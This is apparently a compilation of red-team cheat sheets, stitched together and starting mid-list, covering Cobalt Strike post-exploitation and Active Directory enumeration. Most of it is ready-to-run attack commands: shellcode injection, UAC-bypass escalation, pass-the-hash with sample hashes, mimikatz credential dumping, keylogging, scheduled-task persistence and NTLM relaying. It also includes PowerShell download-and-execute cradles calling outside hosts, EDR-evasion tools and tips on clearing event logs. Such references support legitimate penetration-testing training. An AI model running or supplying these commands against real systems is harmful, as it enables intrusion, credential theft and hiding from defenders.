  - **psinject:** Inject on a specified process and execute a command using powerpick's functionality. \
  :notebook: Powershell modules imported with **powershell-import** are available.
  - **runu:** Run a command under a spoofed process PID.
  - **shinject:** Inject shellcode into another a running process.
  - **shspawn:** Create a new process and inject shellcode into it.
  - **shspawn Usage:**
  ```
  shspawn [x86|x64] [/path/to/my.bin]
  ```
  i.e.
  ```
  shspawn x64 /opt/shellcode/malicious.bin
  ```
  
  ## Privilege Escalation
  - **elevate:** Contains numerous ways to escalate your privileges to Administrator or SYSTEM using kernel exploits and UAC bypasses.
  - **elevate Usage:**
  ```
  elevate [exploit] [listener]
  ```
  i.e.
  ```
  elevate juicypotato Lab-SMB
  elevate ms16-032 Lab-HTTPS
  ...
  ```
  - **getsystem:** Attempts to impersonate system, if it fails we can use steal_token to steal a token from a process that runs as SYSTEM.
  - **getprivs:** Same as metasploit's function, enables all the available privileges on the current token. 
  - **runasadmin:** Attempts to run a command on an elevated context of Administrator or SYSTEM using a local kernel or UAC bypass exploit. The difference with elevate is that it doesnt spawn a new beacon, but executes a specified application of our choice under the new context.
  - **runasadmin Usage:**
  ```
  runasadmin [exploit] [command] [args]
  ```
  i.e.
  
  ```
  runasadmin uac-token-duplication [command]
  runasadmin uac-cmstplua [command] 
  ```
  ## Pivoting
  - **socks:** Start a socks4a proxy server and listen on a specified port. Access through the proxy server can achieved using a proxy client like proxychains or redsocks.
  - **socks Usage:**
  ```
  socks [port]
  ```
  i.e.
  ```
  socks 9050
  ```
  :exclamation: This requires your /etc/proxychains.conf to be configured to match the port specified. If operating on Windows, your proxychains.conf file may be located in %USERPROFILE%\.proxychains\proxychains.conf, (SYSCONFDIR)/proxychains.conf, or (Global programdata dir)\Proxychains\proxychains.conf.
  - **covertvpn:** Deploy a VPN on the current system, will create a new interface and merge it into a specified IP. Using this we can use a local interface to access the internal target network like we would do if we had a real connection through a router.
  
  ## Lateral Movement
  - **portscan:** Performs a portscan on a spesific target.
  - **portscan Usage:**
  ```
  portscan [ip or ip range] [ports]
  ```
  i.e.
  ```
  portscan 172.16.48.0/24 1-2048,3000,8080
  ```
  The above command will scan the entire 172.16.48.0/24 subnet on ports 1 to 2048, 3000 and 8080. This can be utilized for single IPs as well.
  - **runas:** A wrapper of runas.exe, using credentials you can run a command as another user.
  - **runas Usage:**
  ```
  runas [DOMAIN\user] [password] [command] [arguments]
  ```
  i.e.
  ```
  runas CORP\Administrator securePassword12! Powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.50.90:80/filename'))"
  ```
  - **pth:** By providing a username and a NTLM hash you can perform a Pass The Hash attack and inject a TGT on the current process. \
  :exclamation: This module needs Administrator privileges.
  - **pth Usage:**
  ```
  pth [DOMAIN\user] [hash]
  ```
  ```
  pth Administrator 97fc053bc0b23588798277b22540c40d
  pth CORP\Administrator 97fc053bc0b23588798277b22540c40d
  ```
  - **steal_token:** Steal a token from a specified process.
  - **make_token:** By providing credentials you can create an impersonation token into the current process and execute commands from the context of the impersonated user.
  - **jump:** Provides easy and quick way to move lateraly using winrm or psexec to spawn a new beacon session on a target. \
  :exclamation: The **jump** module will use the current delegation/impersonation token to authenticate on the remote target. \
  :muscle: We can combine the **jump** module with the **make_token** or **pth** module for a quick "jump" to another target on the network.
  - **jump Usage:**
  ```
  jump [psexec64,psexec,psexec_psh,winrm64,winrm] [server/workstation] [listener]
  ```
  i.e.
  ```
  jump psexec64 DC01 Lab-HTTPS
  jump winrm WS04 Lab-SMB
  jump psexec_psh WS01 Lab-DNS
  ...
  ```
  - **remote-exec:** Execute a command on a remote target using psexec, winrm or wmi. \
  :exclamation: The **remote-exec** module will use the current delegation/impersonation token to authenticate on the remote target.
  - **remote-exec Usage:**
  ```
  remote-exec [method] [target] [command]
  ```
  - **ssh/ssh-key:** Authenticate using ssh with password or private key. Works for both linux and windows hosts. It gives you basic ssh functionality with some additional post exploitation modules.
  
  ## Exflitration
  - **hashdump:** Dump the local SAM hive's NTLM hashes. This only dumps local machine user credentials.
  - **keylogger:** Will capture keystrokes of a specified process and save them on a database.
  - **keylogger Usage:**
  ```
  keylogger [pid] [x86|x64]
  ```
  i.e.
  ```
  keylogger 8932 x64
  keylogger
  ...
  ```
  This command can also be used without specifying arguments to spawn a temporary process and inject the keystroke logger into it.
  - **screenshot:** Will capture the screen of a current process and save it on the database.
  - **screenshot Usage:**
  ```
  screenshot [pid] [x86|x64] [run time in seconds]
  ```
  i.e.
  ```
  screenshot 1042 x64 15
  screenshot 773 x86 5
  ```
  - **logonpassword:** Executes the well know **logonpasswords** function of mimikatz on the current machine. This function of course uses process injection so isn't OPSEC safe, use it with precaution.
  - **mimikatz:** You can execute any function of mimikatz, mimikatz driver functionality is not included.

  ## Miscellaneous
   - **spawn:** Spawn a new beacon on the current machine, you can choose any type of listener you want.
   - **spawn Usage:**
   ```
   spawn [x86|x64] [listener]
   ```
   i.e.
   ```
   spawn x64 Lab-HTTPS
   spawn x86 Lab-SMB
   ...
   ```
   - **spawnas:** Spawn a new beacon on the current machine as another user by providing credentials.
   - **spawnas Usage:**
   ```
   spawnas [DOMAIN\user] [password] [listener]
   ```
   i.e.
   ```
   spawnas CORP\bob.smith baseBall1942 Lab-SMB
   spawnas Administrator SuperS3cRetPaSsw0rD Lab-HTTPS
   ...
   ```
   - **spawnto:** Sets the executable that beacon will use to spawn and inject shellcode into it for it's post-exploitation functionality. You must specify a full path to the executable.
   ```
   spawnto [x86|x64] [c:\path\to\whatever.exe] 
   ```
   i.e.
   ```
   spawnto x64 c:\programdata\beacon.exe
   spawnto x86 c:\users\S1ckB0y1337\NotMalware\s1ck.exe
   ```
   - **spawnu:** Attempt to spawn a session with a spoofer PID as its parent, the context of the process will match the identity of the specified PID.
   ```
   spawnu [pid] [listener]
   ```
   i.e.
   ```
   spawnu 812 Lab-SMB
   spawnu 9531 Lab-DNS
   ...
   ```
   - **argue:** Will mask/spoof the arguments of a malicious command of our choice with legitimate ones.
   - **blockdlls:** This module will create and set a custom policy on beacon's child processes that will block the injection of any 3rd party dll that is not signed by microsoft, that way we can block any blue team tool that uses dll injection to inspect and kill malicious processes and actions.
   - **blockdlls Usage:**
   ```   
   blockdlls [start|stop]
   ``` 
   - **timestomp:** Tamper the timestamp of a file, by applying another file's timestamp.
   - **timestomp Usage:**
  ```
  timestomp [fileA] [fileB]
  ```
  i.e.
  ```
  timestomp C:\Users\S1ckB0y1337\Desktop\logins.xlsx C:\Users\S1ckB0y1337\Desktop\notmalicious.xlsx
  ```
## OPSEC Notes
 - **Session Prepping:** Before engaging in any post-exploitation action after we have compromised a host, we should prepare our beacon to match the environments behaviour, that way we will generate the less amount of IOCs (Indicators Of Compromise) we can. To do that we can the "spawnto" module to specify which binary our child processes will use to execute post exploitation actions, also we can use the "ppid" module to spoof the parent process that our child processes will spawn under. Both those tricks will provide us with a good amount of stealth and will hide our presence on the compromised host.
 - **Environment Behaviour Blending:** On a post exploitation context even when we are using the http(s) protocols to blend in with the environment's traffic, a good endpoint security solution or a Next Generation firewall can figure out that some traffic is unusual to exist on this environment and will probably block and create telemetry to a SOC endpoint for the blue team to examine it. Thats where "Malleable C2" profiles come, it is a configuration file that each cobalt strike team server can use and it provides customization and flexibility for: beacon's traffic, process injection, process spawning, behaviour, antivirus evasion etc. So the best practise is to never use default beacon behaviour and always use a custom profile for every assessment.
   
## EDR Evasion Tools and Methods
  - [PEzor](https://github.com/phra/PEzor): PE Packer for EDR evasion.
  - [SharpBlock](https://github.com/CCob/SharpBlock): A method of bypassing EDR's active projection DLL's by preventing entry point execution.
  - [TikiTorch](https://github.com/rasta-mouse/TikiTorch): AV/EDR evasion using Process Hollowing Injection.
  - [Donut](https://github.com/TheWover/donut): Donut is a position-independent code that enables in-memory execution of VBScript, JScript, EXE, DLL files and dotNET assemblies.
  - [Dynamic-Invoke](https://thewover.github.io/Dynamic-Invoke/): Bypassing EDR solution by hiding malicious win32 API calls from within C# managed code.
   
## General Post-Exploitation TIPS
  - Before executing anything be sure you know how it behaves and what IOCs (Indicators Of Compromise) it generates.
  - Try to not touch disk as much as you can and operate in memory for the most part.
  - Check AppLocker policies to determine what type of files you can execute and from which locations.
  - Clean up artifacts immediately after finishing a post-exploitation task.
  - Clean event logs after finishing with a host.





# Cobalt-Strike-Cheat-Sheet
## Cobalt Strike

> Cobalt Strike is threat emulation software. Red teams and penetration testers use Cobalt Strike to demonstrate the risk of a breach and evaluate mature security programs. Cobalt Strike exploits network vulnerabilities, launches spear phishing campaigns, hosts web drive-by attacks, and generates malware infected files from a powerful graphical user interface that encourages collaboration and reports all activity.


```powershell
$ sudo apt-get update
$ sudo apt-get install openjdk-11-jdk
$ sudo apt install proxychains socat
$ sudo update-java-alternatives -s java-1.11.0-openjdk-amd64
$ sudo ./teamserver 10.10.10.10 "password" [malleable C2 profile]
$ ./cobaltstrike
$ powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://campaigns.example.com/download/dnsback'))" 
```

## Summary

* [Infrastructure](#infrastructure)
    * [Redirectors](#redirectors)
    * [Domain fronting](#domain-fronting)
* [OpSec](#opsec)
    * [Customer ID](#customer-id)
* [Payloads](#payloads)
    * [DNS Beacon](#dns-beacon)
    * [SMB Beacon](#smb-beacon)
    * [Metasploit compatibility](#metasploit-compatibility)
    * [Custom Payloads](#custom-payloads)
* [Malleable C2](#malleable-c2)
* [Files](#files)
* [Powershell and .NET](#powershell-and-net)
    * [Powershell commabds](#powershell-commands)
    * [.NET remote execution](#net-remote-execution)
* [Lateral Movement](#lateral-movement)
* [VPN & Pivots](#vpn--pivots)
* [Kits](#kits)
    * [Elevate Kit](#elevate-kit)
    * [Persistence Kit](#persistence-kit)
    * [Resource Kit](#resource-kit)
    * [Artifact Kit](#artifact-kit)
    * [Mimikatz Kit](#mimikatz-kit)
* [Beacon Object Files](#beacon-object-files)
* [NTLM Relaying via Cobalt Strike](#ntlm-relaying-via-cobalt-strike)
* [References](#references)


## Infrastructure

### Redirectors

```powershell
sudo apt install socat
socat TCP4-LISTEN:80,fork TCP4:[TEAM SERVER]:80
```

### Domain Fronting

* New Listener > HTTP Host Header
* Choose a domain in "Finance & Healthcare" sector 

## OpSec

**Don't**
* Use default self-signed HTTPS certificate
* Use default port (50050)
* Use 0.0.0.0 DNS response
* Metasploit compatibility, ask for a payload : `wget -U "Internet Explorer" http://127.0.0.1/vl6D`

**Do**
* Use a redirector (Apache, CDN, ...)
* Firewall to only accept HTTP/S from the redirectors
* Firewall 50050 and access via SSH tunnel
* Edit default HTTP 404 page and Content type: text/plain
* No staging `set hosts_stage` to `false` in Malleable C2
* Use Malleable Profile to taylor your attack to specific actors

### Customer ID

> The Customer ID is a 4-byte number associated with a Cobalt Strike license key. Cobalt Strike 3.9 and later embed this information into the payload stagers and stages generated by Cobalt Strike.

* The Customer ID value is the last 4-bytes of a Cobalt Strike payload stager in Cobalt Strike 3.9 and later.
* The trial has a Customer ID value of 0. 
* Cobalt Strike does not use the Customer ID value in its network traffic or other parts of the tool

## Payloads

### DNS Beacon

* Edit the Zone File for the domain
* Create an A record for Cobalt Strike system
* Create an NS record that points to FQDN of your Cobalt Strike system

Your Cobalt Strike team server system must be authoritative for the domains you specify. Create a DNS A record and point it to your Cobalt Strike team server. Use DNS NS records to delegate several domains or sub-domains to your Cobalt Strike team server's A record.

* nslookup jibberish.beacon polling.campaigns.domain.com
* nslookup jibberish.beacon campaigns.domain.com

Example of DNS on Digital Ocean:

```powershell
NS  example.com                     directs to 10.10.10.10.            86400
NS  polling.campaigns.example.com   directs to campaigns.example.com.	3600
A	campaigns.example.com           directs to 10.10.10.10	            3600 
```

```powershell
systemctl disable systemd-resolved
systemctl stop systemd-resolved
rm /etc/resolv.conf
echo "nameserver 8.8.8.8" >  /etc/resolv.conf
echo "nameserver 8.8.4.4" >>  /etc/resolv.conf
```

Configuration:
1. **host**: campaigns.domain.com
2. **beacon**: polling.campaigns.domain.com
3. Interact with a beacon, and `sleep 0`


### SMB Beacon   

```powershell
link [host] [pipename]
connect [host] [port]
unlink [host] [PID]
jump [exec] [host] [pipe]
```

SMB Beacon uses Named Pipes. You might encounter these error code while running it.

| Error Code | Meaning              | Description                                        |
|------------|----------------------|----------------------------------------------------|
| 2          | File Not Found       | There is no beacon for you to link to              |
| 5          | Access is denied     | Invalid credentials or you don't have permission   |
| 53         | Bad Netpath          | You have no trust relationship with the target system. It may or may not be a beacon there. |


### SSH Beacon

```powershell
# deploy a beacon
beacon> help ssh
Use: ssh [target:port] [user] [pass]
Spawn an SSH client and attempt to login to the specified target

beacon> help ssh-key
Use: ssh [target:port] [user] [/path/to/key.pem]
Spawn an SSH client and attempt to login to the specified target

# beacon's commands
upload                    Upload a file
download                  Download a file
socks                     Start SOCKS4a server to relay traffic
sudo                      Run a command via sudo
rportfwd                  Setup a reverse port forward
shell                     Execute a command via the shell
```

### Metasploit compatibility

* Payload: windows/meterpreter/reverse_http or windows/meterpreter/reverse_https
* Set LHOST and LPORT to the beacon
* Set DisablePayloadHandler to True
* Set PrependMigrate to True
* exploit -j

### Custom Payloads

https://ired.team/offensive-security/code-execution/using-msbuild-to-execute-shellcode-in-c

```powershell
* Attacks > Packages > Payload Generator 
* Attacks > Packages > Scripted Web Delivery (S)
$ python2 ./shellcode_encoder.py -cpp -cs -py payload.bin MySecretPassword xor
$ C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe C:\Windows\Temp\dns_raw_stageless_x64.xml
$ %windir%\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe \\10.10.10.10\Shared\dns_raw_stageless_x86.xml
```

## Malleable C2

List of Malleable Profiles hosted on Github
* Cobalt Strike - Malleable C2 Profiles https://github.com/xx0hcd/Malleable-C2-Profiles
* Cobalt Strike Malleable C2 Design and Reference Guide https://github.com/threatexpress/malleable-c2
* Malleable-C2-Profiles https://github.com/rsmudge/Malleable-C2-Profiles
* SourcePoint is a C2 profile generator https://github.com/Tylous/SourcePoint

Example of syntax

```powershell
set useragent "SOME AGENT"; # GOOD
set useragent 'SOME AGENT'; # BAD
prepend "This is an example;";

# Escape Double quotes
append "here is \"some\" stuff";
# Escape Backslashes
append "more \\ stuff";
# Some special characters do not need escaping
prepend "!@#$%^&*()";
```

Check a profile with `./c2lint`.
* A result of 0 is returned if c2lint completes with no errors
* A result of 1 is returned if c2lint completes with only warnings
* A result of 2 is returned if c2lint completes with only errors
* A result of 3 is returned if c2lint completes with both errors and warning

## Files

```powershell
# List the file on the specified directory
beacon > ls <C:\Path>

# Change into the specified working directory
beacon > cd [directory]

# Delete a file\folder
beacon > rm [file\folder]

# File copy
beacon > cp [src] [dest]

# Download a file from the path on the Beacon host
beacon > download [C:\filePath]

# Lists downloads in progress
beacon > downloads

# Cancel a download currently in progress
beacon > cancel [*file*]

# Upload a file from the attacker to the current Beacon host
beacon > upload [/path/to/file]
```

## Powershell and .NET

### Powershell commands

```powershell
# Import a Powershell .ps1 script from the control server and save it in memory in Beacon
beacon > powershell-import [/path/to/script.ps1]

# Setup a local TCP server bound to localhost and download the script imported from above using powershell.exe. Then the specified function and any arguments are executed and output is returned.
beacon > powershell [commandlet][arguments]

# Launch the given function using Unmanaged Powershell, which does not start powershell.exe. The program used is set by spawnto
beacon > powerpick [commandlet] [argument]

# Inject Unmanaged Powershell into a specific process and execute the specified command. This is useful for long-running Powershell jobs
beacon > psinject [pid][arch] [commandlet] [arguments]
```

### .NET remote execution

Run a local .NET executable as a Beacon post-exploitation job. 

Require:
* Binaries compiled with the "Any CPU" configuration.

```powershell
beacon > execute-assembly [/path/to/script.exe] [arguments]
beacon > execute-assembly /home/audit/Rubeus.exe
[*] Tasked beacon to run .NET program: Rubeus.exe
[+] host called home, sent: 318507 bytes
[+] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.4.2 
```

## Lateral Movement

:warning: OPSEC Advice: Use the **spawnto** command to change the process Beacon will launch for its post-exploitation jobs. The default is rundll32.exe 

- **portscan:** Performs a portscan on a spesific target.
- **runas:** A wrapper of runas.exe, using credentials you can run a command as another user.
- **pth:** By providing a username and a NTLM hash you can perform a Pass The Hash attack and inject a TGT on the current process. \
:exclamation: This module needs Administrator privileges.
- **steal_token:** Steal a token from a specified process.
- **make_token:** By providing credentials you can create an impersonation token into the current process and execute commands from the context of the impersonated user.
- **jump:** Provides easy and quick way to move lateraly using winrm or psexec to spawn a new beacon session on a target. \
:exclamation: The **jump** module will use the current delegation/impersonation token to authenticate on the remote target. \
:muscle: We can combine the **jump** module with the **make_token** or **pth** module for a quick "jump" to another target on the network.
- **remote-exec:** Execute a command on a remote target using psexec, winrm or wmi. \
:exclamation: The **remote-exec** module will use the current delegation/impersonation token to authenticate on the remote target.
- **ssh/ssh-key:** Authenticate using ssh with password or private key. Works for both linux and windows hosts.

:warning: All the commands launch powershell.exe

```powershell
Beacon Remote Exploits
======================
jump [module] [target] [listener] 

    psexec	x86	Use a service to run a Service EXE artifact
    psexec64	x64	Use a service to run a Service EXE artifact
    psexec_psh	x86	Use a service to run a PowerShell one-liner
    winrm	x86	Run a PowerShell script via WinRM
    winrm64	x64	Run a PowerShell script via WinRM

Beacon Remote Execute Methods
=============================
remote-exec [module] [target] [command] 

    Methods                         Description
    -------                         -----------
    psexec                          Remote execute via Service Control Manager
    winrm                           Remote execute via WinRM (PowerShell)
    wmi                             Remote execute via WMI (PowerShell)

```

Opsec safe Pass-the-Hash:
1. `mimikatz sekurlsa::pth /user:xxx /domain:xxx /ntlm:xxxx /run:"powershell -w hidden"`
2. `steal_token PID`

### Assume Control of Artifact

* Use `link` to connect to SMB Beacon
* Use `connect` to connect to TCP Beacon


## VPN & Pivots

:warning: Covert VPN doesn't work with W10, and requires Administrator access to deploy.

> Use socks 8080 to setup a SOCKS4a proxy server on port 8080 (or any other port you choose). This will setup a SOCKS proxy server to tunnel traffic through Beacon. Beacon's sleep time adds latency to any traffic you tunnel through it. Use sleep 0 to make Beacon check-in several times a second.

```powershell
# Start a SOCKS server on the given port on your teamserver, tunneling traffic through the specified Beacon. Set the teamserver/port configuration in /etc/proxychains.conf for easy usage.
beacon > socks [PORT]

# Proxy browser traffic through a specified Internet Explorer process.
beacon > browserpivot [pid] [x86|x64]

# Bind to the specified port on the Beacon host, and forward any incoming connections to the forwarded host and port.
beacon > rportfwd [bind port] [forward host] [forward port]

# spunnel : Spawn an agent and create a reverse port forward tunnel to its controller.    ~=  rportfwd + shspawn.
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f raw -o /tmp/msf.bin
beacon> spunnel x64 184.105.181.155 4444 C:\Payloads\msf.bin

# spunnel_local: Spawn an agent and create a reverse port forward, tunnelled through your Cobalt Strike client, to its controller
# then you can handle the connect back on your MSF multi handler
beacon> spunnel_local x64 127.0.0.1 4444 C:\Payloads\msf.bin
```

## Kits

* [Cobalt Strike Community Kit](https://cobalt-strike.github.io/community_kit/) - Community Kit is a central repository of extensions written by the user community to extend the capabilities of Cobalt Strike

### Elevate Kit

UAC Token Duplication : Fixed in Windows 10 Red Stone 5 (October 2018)

```powershell
beacon> runasadmin

Beacon Command Elevators
========================

    Exploit                         Description
    -------                         -----------
    ms14-058                        TrackPopupMenu Win32k NULL Pointer Dereference (CVE-2014-4113)
    ms15-051                        Windows ClientCopyImage Win32k Exploit (CVE 2015-1701)
    ms16-016                        mrxdav.sys WebDav Local Privilege Escalation (CVE 2016-0051)
    svc-exe                         Get SYSTEM via an executable run as a service
    uac-schtasks                    Bypass UAC with schtasks.exe (via SilentCleanup)
    uac-token-duplication           Bypass UAC with Token Duplication
```

### Persistence Kit

* https://github.com/0xthirteen/MoveKit
* https://github.com/fireeye/SharPersist
    ```powershell
    # List persistences
    SharPersist -t schtaskbackdoor -m list
    SharPersist -t startupfolder -m list
    SharPersist -t schtask -m list

    # Add a persistence
    SharPersist -t schtaskbackdoor -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Something Cool" -m add
    SharPersist -t schtaskbackdoor -n "Something Cool" -m remove

    SharPersist -t service -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Service" -m add
    SharPersist -t service -n "Some Service" -m remove

    SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Task" -m add
    SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Task" -m add -o hourly
    SharPersist -t schtask -n "Some Task" -m remove
    ```

### Resource Kit

> The Resource Kit is Cobalt Strike's means to change the HTA, PowerShell, Python, VBA, and VBS script templates Cobalt Strike uses in its workflows

### Artifact Kit

> Cobalt Strike uses the Artifact Kit to generate its executables and DLLs. The Artifact Kit is a source code framework to build executables and DLLs that evade some anti-virus products. The Artifact Kit build script creates a folder with template artifacts for each Artifact Kit technique. To use a technique with Cobalt Strike, go to Cobalt Strike -> Script Manager, and load the artifact.cna script from that technique's folder.

Artifact Kit (Cobalt Strike 4.0) - https://www.youtube.com/watch?v=6mC21kviwG4 :

- Download the artifact kit : `Go to Help -> Arsenal to download Artifact Kit (requires a licensed version of Cobalt Strike)`
- Install the dependencies : `sudo apt-get install mingw-w64`
- Edit the Artifact code
    * Change pipename strings
    * Change `VirtualAlloc` in `patch.c`/`patch.exe`, e.g: HeapAlloc
    * Change Import
- Build the Artifact
- Cobalt Strike -> Script Manager > Load .cna

### Mimikatz Kit

* Download and extract the .tgz from the Arsenal (Note: The version uses the Mimikatz release version naming (i.e., 2.2.0.20210724)
* Load the mimikatz.cna aggressor script
* Use mimikatz functions as normal

### Sleep Mask Kit

> The Sleep Mask Kit is the source code for the sleep mask function that is executed to obfuscate Beacon, in memory, prior to sleeping.

Use the included `build.sh` or `build.bat` script to build the Sleep Mask Kit on Kali Linux or Microsoft Windows. The script builds the sleep mask object file for the three types of Beacons (default, SMB, and TCP) on both x86 and x64 architectures in the sleepmask directory. The default type supports HTTP, HTTPS, and DNS Beacons.


## Beacon Object Files

> A BOF is just a block of position-independent code that receives pointers to some Beacon internal APIs

Example: https://github.com/Cobalt-Strike/bof_template/blob/main/beacon.h

* Compile
    ```ps1
    # To compile this with Visual Studio:
    cl.exe /c /GS- hello.c /Fohello.o

    # To compile this with x86 MinGW:
    i686-w64-mingw32-gcc -c hello.c -o hello.o

    # To compile this with x64 MinGW:
    x86_64-w64-mingw32-gcc -c hello.c -o hello.o
    ```
* Execute: `inline-execute /path/to/hello.o`

## NTLM Relaying via Cobalt Strike

```powershell
beacon> socks 1080
kali> proxychains python3 /usr/local/bin/ntlmrelayx.py -t smb://<IP_TARGET>
beacon> rportfwd_local 8445 <IP_KALI> 445
beacon> upload C:\Tools\PortBender\WinDivert64.sys
beacon> PortBender redirect 445 8445
```

## References

* [Red Team Ops with Cobalt Strike (1 of 9): Operations](https://www.youtube.com/watch?v=q7VQeK533zI)
* [Red Team Ops with Cobalt Strike (2 of 9): Infrastructure](https://www.youtube.com/watch?v=5gwEMocFkc0)
* [Red Team Ops with Cobalt Strike (3 of 9): C2](https://www.youtube.com/watch?v=Z8n9bIPAIao)
* [Red Team Ops with Cobalt Strike (4 of 9): Weaponization](https://www.youtube.com/watch?v=H0_CKdwbMRk)
* [Red Team Ops with Cobalt Strike (5 of 9): Initial Access](https://www.youtube.com/watch?v=bYt85zm4YT8)
* [Red Team Ops with Cobalt Strike (6 of 9): Post Exploitation](https://www.youtube.com/watch?v=Pb6yvcB2aYw)
* [Red Team Ops with Cobalt Strike (7 of 9): Privilege Escalation](https://www.youtube.com/watch?v=lzwwVwmG0io)
* [Red Team Ops with Cobalt Strike (8 of 9): Lateral Movement](https://www.youtube.com/watch?v=QF_6zFLmLn0)
* [Red Team Ops with Cobalt Strike (9 of 9): Pivoting](https://www.youtube.com/watch?v=sP1HgUu7duU&list=PL9HO6M_MU2nfQ4kHSCzAQMqxQxH47d1no&index=10&t=0s)
* [A Deep Dive into Cobalt Strike Malleable C2 - Joe Vest - Sep 5, 2018 ](https://posts.specterops.io/a-deep-dive-into-cobalt-strike-malleable-c2-6660e33b0e0b)
* [Cobalt Strike. Walkthrough for Red Teamers - Neil Lines - 15 Apr 2019](https://www.pentestpartners.com/security-blog/cobalt-strike-walkthrough-for-red-teamers/)
* [TALES OF A RED TEAMER: HOW TO SETUP A C2 INFRASTRUCTURE FOR COBALT STRIKE – UB 2018 - NOV 25 2018](https://holdmybeersecurity.com/2018/11/25/tales-of-a-red-teamer-how-to-setup-a-c2-infrastructure-for-cobalt-strike-ub-2018/)
* [Cobalt Strike - DNS Beacon](https://www.cobaltstrike.com/help-dns-beacon)
* [How to Write Malleable C2 Profiles for Cobalt Strike - January 24, 2017](https://bluescreenofjeff.com/2017-01-24-how-to-write-malleable-c2-profiles-for-cobalt-strike/)
* [NTLM Relaying via Cobalt Strike - July 29, 2021 - Rasta Mouse](https://rastamouse.me/ntlm-relaying-via-cobalt-strike/)
* [Cobalt Strike - User Guide](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/welcome_main.htm)
* [Cobalt Strike 4.5 - User Guide PDF](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/cobalt-4-5-user-guide.pdf)



# CRTP-cheatsheet

# Summary
* [General](#General)
* [Domain Enumeration](#Domain-Enumeration)
    * [Powerview Domain](#Powerview-Domain)
    * [Powerview Users, groups and computers](#Powerview-users-groups-and-computers) 
    * [Powerview Shares](#Powerview-shares)
    * [Powerview GPO](#Powerview-GPO)
    * [Powerview ACL](#Powerview-ACL)
    * [Powerview Domain Trust](#Powerview-Domain-Trust)
    * [Misc](#misc) 
* [Local privilege escalation](#Local-privilege-escalation)
* [Lateral Movement](#Lateral-Movement)
   * [General](#General) 
   * [Mimikatz](#Mimikatz) 
* [Domain Persistence](#Domain-Persistence)
   * [Golden Ticket](#Golden-Ticket) 
   * [Silver Ticket](#Silver-Ticket)
   * [Skeleton Key](#Skeleton-Key)
   * [DSRM](#DSRM)
   * [Custom SSP - Track logons](#Custom-SSP---Track-logons)
   * [ACL](#ACL)
      * [AdminSDHolder](#AdminSDHolder)
      * [DCsync](#DCsync)
      * [SecurityDescriptor - WMI](#SecurityDescriptor---WMI)
      * [SecurityDescriptor - Powershell Remoting](#SecurityDescriptor---Powershell-Remoting)
      * [SecurityDescriptor - Remote Registry](#SecurityDescriptor---Remote-Registry)
* [Domain privilege escalation](#Domain-privilege-escalation)
   * [Kerberoast](#Kerberoast) 
   * [AS-REPS Roasting](#AS-REPS-Roasting) 
   * [Set SPN](#Set-SPN) 
   * [Unconstrained Delegation](#Unconstrained-delegation) 
   * [Constrained Delegation](#Constrained-delegation) 
   * [DNS Admins](#DNS-Admins) 
   * [Enterprise Admins](#Enterprise-Admins) 
      * [Child to parent - Trust tickets](#Child-to-parent---Trust-tickets)
      * [Child to parent - krbtgt hash](#Child-to-parent---krbtgt-hash)
   * [Crossforest attacks](#Crossforest-attacks)
      * [Trust flow](#Trust-flow) 
      * [Trust abuse SQL](#Trust-abuse-SQL) 
   
# General
#### Access C disk of a computer (check local admin)
```
ls \\<computername>\c$
```

#### Use this parameter to not print errors powershell
```
-ErrorAction SilentlyContinue
```

#### Rename powershell windows
```
$host.ui.RawUI.WindowTitle = "<naam>"
```

#### Impacket PSexec impacket
If no LM Hash use an empty one: ```aad3b435b51404eeaad3b435b51404ee```
```
python3 psexec.py -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME>@<TARGET>
python3 psexec.py <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET>
```

# Domain Enumeration
## Powerview Domain
https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon
```
. ./PowerView.ps1
```

#### Get current domain
```
Get-NetDomain
```

#### Get object of another domain
```
Get-NetDomain -Domain <domainname>
```

#### Get Domain SID for the current domain
```
Get-DomainSID
```

#### Get the domain password policy
```
Get-DomainPolicy
(Get-DomainPolicy)."System Access"
net accounts
```

## Powerview users groups and computers
#### Get Information of domain controller
```
Get-NetDomainController
Get-NetDomainController | select-object Name
```

#### Get information of users in the domain
```
Get-NetUser
Get-NetUser -Username <username>
```

#### Get list of all users
```
Get-NetUser | select samaccountname
```

#### Get list of usernames, last logon and password last set
```
Get-NetUser | select samaccountname, lastlogon, pwdlastset
Get-NetUser | select samaccountname, lastlogon, pwdlastset | Sort-Object -Property lastlogon
```

#### Get list of usernames and their groups
```
Get-NetUser | select samaccountname, memberof
```

#### Get list of all properties for users in the current domain
```
get-userproperty -Properties pwdlastset
```

#### Get descripton field from the user
```
Find-UserField -SearchField Description -SearchTerm "built"
Get-netuser | Select-Object samaccountname,description
```

#### Get computer information
```
Get-NetComputer
Get-NetComputer -FullData
Get-NetComputer -Computername <computername> -FullData
```

#### Get computers with operating system ""
```
Get-NetComputer -OperatingSystem "*Server 2016*"
```

#### Get list of all computer names and operating systems
```
Get-NetComputer -fulldata | select samaccountname, operatingsystem, operatingsystemversion
```

#### List all groups of the domain
```
Get-NetGroup
Get-NetGroup -GroupName *admin*
Get-NetGroup -Domain <domain>
```

#### Get all the members of the group
```
Get-NetGroupMember -Groupname "Domain Admins" -Recurse
Get-NetGroupMember -Groupname "Domain Admins" -Recurse | select MemberName
```

#### Get the group membership of a user
```
Get-NetGroup -Username <username>
```

#### List all the local groups on a machine (needs admin privs on non dc machines)
```
Get-NetlocalGroup -Computername <computername> -ListGroups
```

#### Get Member of all the local groups on a machine (needs admin privs on non dc machines)
```
Get-NetlocalGroup -Computername <computername> -Recurse
```

